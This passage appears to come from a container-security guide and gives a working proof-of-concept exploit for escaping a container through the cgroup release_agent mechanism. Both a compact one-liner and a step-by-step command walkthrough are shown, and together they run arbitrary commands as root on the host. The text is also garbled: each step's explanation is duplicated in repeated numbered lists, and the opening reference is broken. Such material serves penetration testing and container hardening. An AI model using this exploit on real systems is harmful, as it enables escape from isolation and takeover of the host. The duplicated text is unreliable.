For further details, refer to the . This is just a summary:

Original PoC:

```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. Here's a breakdown of the steps involved:

1. Prepare the Environment:

A directory `/tmp/cgrp` is created to serve as a mount point for the cgroup.

The RDMA cgroup controller is mounted to this directory. In case of absence of the RDMA controller, it's suggested to use the `memory` cgroup controller as an alternative.

2. A directory `/tmp/cgrp` is created to serve as a mount point for the cgroup.

3. The RDMA cgroup controller is mounted to this directory. In case of absence of the RDMA controller, it's suggested to use the `memory` cgroup controller as an alternative.

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

1. Set Up the Child Cgroup:

A child cgroup named "x" is created within the mounted cgroup directory.

Notifications are enabled for the "x" cgroup by writing 1 to its notify_on_release file.

2. A child cgroup named "x" is created within the mounted cgroup directory.

3. Notifications are enabled for the "x" cgroup by writing 1 to its notify_on_release file.

```
echo 1 > /tmp/cgrp/x/notify_on_release
```

1. Configure the Release Agent:

The path of the container on the host is obtained from the /etc/mtab file.

The release_agent file of the cgroup is then configured to execute a script named /cmd located at the acquired host path.

2. The path of the container on the host is obtained from the /etc/mtab file.

3. The release_agent file of the cgroup is then configured to execute a script named /cmd located at the acquired host path.

```
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

1. Create and Configure the /cmd Script:

The /cmd script is created inside the container and is configured to execute ps aux, redirecting the output to a file named /output in the container. The full path of /output on the host is specified.

2. The /cmd script is created inside the container and is configured to execute ps aux, redirecting the output to a file named /output in the container. The full path of /output on the host is specified.

```
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```

1. Trigger the Attack:

A process is initiated within the "x" child cgroup and is immediately terminated.

This triggers the `release_agent` (the /cmd script), which executes ps aux on the host and writes the output to /output within the container.

2. A process is initiated within the "x" child cgroup and is immediately terminated.

3. This triggers the `release_agent` (the /cmd script), which executes ps aux on the host and writes the output to /output within the container.

```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```